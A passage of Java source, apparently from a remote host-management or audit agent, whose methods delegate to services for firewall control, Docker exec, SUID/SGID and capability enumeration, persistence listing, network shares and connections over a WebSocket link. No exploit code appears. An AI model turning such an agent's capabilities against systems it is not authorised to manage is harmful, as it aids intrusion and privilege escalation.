                                                 int topN, int maxScan, String keyword,
                                                 Integer minStatus, Integer maxStatus,
                                                 String ipPrefix, String pathPrefix) throws Exception {
        return eventLogService.aggregate(source, format, groupBy, topN, maxScan, keyword,
                minStatus, maxStatus, ipPrefix, pathPrefix);
    }

    @Override
    public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
                                                 int topN, int maxScan, int maxBytes, String keyword,
                                                 Integer minStatus, Integer maxStatus,
                                                 String ipPrefix, String pathPrefix, boolean slow) throws Exception {
        return eventLogService.aggregate(source, format, groupBy, topN, maxScan, maxBytes, keyword,
                minStatus, maxStatus, ipPrefix, pathPrefix, slow);
    }

    @Override
    public Map<String, Object> previewEventLog(String source, int lines, boolean fromTail) throws Exception {
        return eventLogService.meta(source, null, lines, fromTail);
    }

    @Override
    public Map<String, Object> metaEventLog(String source, String format) throws Exception {
        return eventLogService.meta(source, format);
    }

    @Override
    public Map<String, Object> metaEventLog(String source, String format, int lines, boolean fromTail) throws Exception {
        return eventLogService.meta(source, format, lines, fromTail);
    }

    // ==================== 用户账户管理 ====================

    @Override
    public Map<String, Object> listUsers() throws Exception {
        return userAccountService.listUsers();
    }

    @Override
    public Map<String, Object> listGroups() throws Exception {
        return userAccountService.listGroups();
    }

    @Override
    public Map<String, Object> queryUser(String username) throws Exception {
        return userAccountService.queryUser(username);
    }

    @Override
    public Map<String, Object> queryGroup(String groupName) throws Exception {
        return userAccountService.queryGroup(groupName);
    }

    @Override
    public Map<String, Object> whoami() throws Exception {
        return userAccountService.whoami();
    }

    // ==================== 防火墙管理 ====================

    @Override
    public Map<String, Object> getFirewallStatus() throws Exception {
        return firewallService.status();
    }

    @Override
    public Map<String, Object> listFirewallRules(String direction, String profile) throws Exception {
        return firewallService.listRules(direction, profile);
    }

    @Override
    public Map<String, Object> addFirewallRule(String ruleName, String direction, String action,
                                                String protocol, String localPort, String remotePort,
                                                String remoteAddress, String rawRule) throws Exception {
        return firewallService.addRule(ruleName, direction, action, protocol, localPort, remotePort, remoteAddress, rawRule);
    }

    @Override
    public Map<String, Object> deleteFirewallRule(String ruleName, String ruleIndex, String rawRule) throws Exception {
        return firewallService.deleteRule(ruleName, ruleIndex, rawRule);
    }

    @Override
    public Map<String, Object> toggleFirewall(boolean enable) throws Exception {
        return firewallService.toggleFirewall(enable);
    }

    // ==================== 网络共享管理 ====================

    @Override
    public Map<String, Object> listNetworkShares() throws Exception {
        return networkShareService.listShares();
    }

    @Override
    public Map<String, Object> listNetworkMounts() throws Exception {
        return networkShareService.listMounts();
    }

    @Override
    public Map<String, Object> queryNetworkShare(String shareName) throws Exception {
        return networkShareService.queryShare(shareName);
    }

    @Override
    public Map<String, Object> connectNetworkShare(String remotePath, String localDrive,
                                                    String mountPoint, String username,
                                                    String password) throws Exception {
        return networkShareService.connectShare(remotePath, localDrive, mountPoint, username, password);
    }

    @Override
    public Map<String, Object> disconnectNetworkShare(String target) throws Exception {
        return networkShareService.disconnectShare(target);
    }

    // ==================== 已安装软件枚举 ====================

    @Override
    public Map<String, Object> listAllSoftware() throws Exception {
        return installedSoftwareService.listAll();
    }

    @Override
    public Map<String, Object> listSystemSoftware() throws Exception {
        return installedSoftwareService.listSystem();
    }

    @Override
    public Map<String, Object> listUserSoftware() throws Exception {
        return installedSoftwareService.listUser();
    }

    @Override
    public Map<String, Object> searchSoftware(String keyword) throws Exception {
        return installedSoftwareService.searchSoftware(keyword);
    }

    // ==================== Docker 容器管理 ====================

    @Override
    public Map<String, Object> listDockerContainers(boolean all) throws Exception {
        return dockerContainerService.listContainers(all);
    }

    @Override
    public Map<String, Object> listDockerImages() throws Exception {
        return dockerContainerService.listImages();
    }

    @Override
    public Map<String, Object> inspectDockerContainer(String containerId) throws Exception {
        return dockerContainerService.inspectContainer(containerId);
    }

    @Override
    public Map<String, Object> getDockerContainerLogs(String containerId, int tail) throws Exception {
        return dockerContainerService.containerLogs(containerId, tail);
    }

    @Override
    public Map<String, Object> listDockerNetworks() throws Exception {
        return dockerContainerService.listNetworks();
    }

    @Override
    public Map<String, Object> getDockerInfo() throws Exception {
        return dockerContainerService.dockerInfo();
    }

    @Override
    public Map<String, Object> execInDockerContainer(String containerId, String cmd) throws Exception {
        return dockerContainerService.execInContainer(containerId, cmd);
    }

    @Override
    public Map<String, Object> startDockerContainer(String containerId) throws Exception {
        return dockerContainerService.startContainer(containerId);
    }

    @Override
    public Map<String, Object> stopDockerContainer(String containerId, int timeout) throws Exception {
        return dockerContainerService.stopContainer(containerId, timeout);
    }

    @Override
    public Map<String, Object> restartDockerContainer(String containerId, int timeout) throws Exception {
        return dockerContainerService.restartContainer(containerId, timeout);
    }

    @Override
    public Map<String, Object> pauseDockerContainer(String containerId) throws Exception {
        return dockerContainerService.pauseContainer(containerId);
    }

    @Override
    public Map<String, Object> unpauseDockerContainer(String containerId) throws Exception {
        return dockerContainerService.unpauseContainer(containerId);
    }

    @Override
    public Map<String, Object> removeDockerContainer(String containerId, boolean force) throws Exception {
        return dockerContainerService.removeContainer(containerId, force);
    }

    @Override
    public Map<String, Object> removeDockerImage(String imageId, boolean force) throws Exception {
        return dockerContainerService.removeImage(imageId, force);
    }

    // ==================== SUID/SGID/Capabilities 枚举 ====================

    @Override
    public Map<String, Object> listSuidFiles() throws Exception {
        return suidCapabilityService.listSuid();
    }

    @Override
    public Map<String, Object> listSgidFiles() throws Exception {
        return suidCapabilityService.listSgid();
    }

    @Override
    public Map<String, Object> listFileCapabilities() throws Exception {
        return suidCapabilityService.listCapabilities();
    }

    @Override
    public Map<String, Object> listAllSuidCaps() throws Exception {
        return suidCapabilityService.listAll();
    }

    // ==================== Persistence ====================

    @Override
    public Map<String, Object> listPersistence() throws Exception {
        return persistenceService.list();
    }

    @Override
    public Map<String, Object> queryPersistence(String name, String type, String path) throws Exception {
        return persistenceService.query(name, type, path);
    }

    // ==================== NetworkConnection ====================

    @Override
    public Map<String, Object> listNetworkConnections(String state, String protocol, String port,
                                                       String pid, String process, String remoteIp,
                                                       boolean listeningOnly, int maxEntries) throws Exception {
        return networkConnectionService.list(state, protocol, port, pid, process, remoteIp, listeningOnly, maxEntries);
    }

    @Override
    public Map<String, Object> listNetworkConnections() throws Exception {
        return networkConnectionService.list();
    }

    @Override
    public Map<String, Object> networkConnectionSummary() throws Exception {
        return networkConnectionService.summary();
    }

    @Override
    public void close() throws Exception {
        Exception failure = null;
        try {
            networkProxyManager.close();
        } catch (Exception e) {
            failure = e;
        }
        try {
            if (httpSenderService != null) httpSenderService.close();
        } catch (Exception e) {
            if (failure == null) failure = e; else failure.addSuppressed(e);
        }
        try {
            if (communication instanceof java.io.Closeable closeable) {
                closeable.close();
            } else if (communication instanceof org.java_websocket.client.WebSocketClient webSocketClient) {
                webSocketClient.close();
            }
        } catch (Exception e) {
            if (failure == null) failure = e; else failure.addSuppressed(e);
        } finally {
            serviceRegistry.clear();
            synchronized (this) {
                allLoadedComponent.clear();
                loadedComponentHostLastSeen.clear();
            }
            componentLoadRegistry.clear();
        }
        if (failure != null) throw failure;
    }
}
